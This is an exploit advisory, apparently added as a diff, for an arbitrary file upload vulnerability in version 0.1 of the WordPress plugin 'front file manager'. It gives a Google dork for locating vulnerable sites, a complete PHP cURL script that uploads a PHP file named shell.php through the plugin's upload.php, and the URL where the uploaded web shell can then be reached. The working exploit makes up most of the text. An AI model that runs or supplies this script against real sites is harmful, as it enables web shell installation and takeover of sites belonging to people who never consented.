@@ -1,0 +1,31 @@
+# Exploit Title: Wordpress front file manager 0.1 Arbitrary File Upload
+# Google Dork: inurl:wp-content/plugins/front-file-manager/
+# Date: 07/06/2012
+# Exploit Author: Adrien Thierry 
+# adrien dot thierryfr at gmail dot com
+# Vendor Homepage: http://www.webikon.sk/en
+# Software Link: http://downloads.wordpress.org/plugin/front-file-manager.zip
+# Version: 0.1
+
+Page upload.php is vulnerable to Remote File Upload. Code :
+
+<?php
+$u="whatyouwant.php";
+$c = curl_init("http://site.com/wp-content/plugins/front-file-manager/upload.php");
+curl_setopt($c, CURLOPT_POST, true);
+curl_setopt($c, CURLOPT_POSTFIELDS,
+array('file'=>"@$u",
+'name'=>"shell.php"));
+curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+$e = curl_exec($c);
+curl_close($c);
+echo $e; 
+?>
+
+
+
+Shell could be found at :
+	http://site.com/wp-content/plugins/uploads/2012/06/shell.php
+	(http://site.com/wp-content/plugins/uploads/[YYYY]/[MM]/shell.php
+	
+#########################################################################################
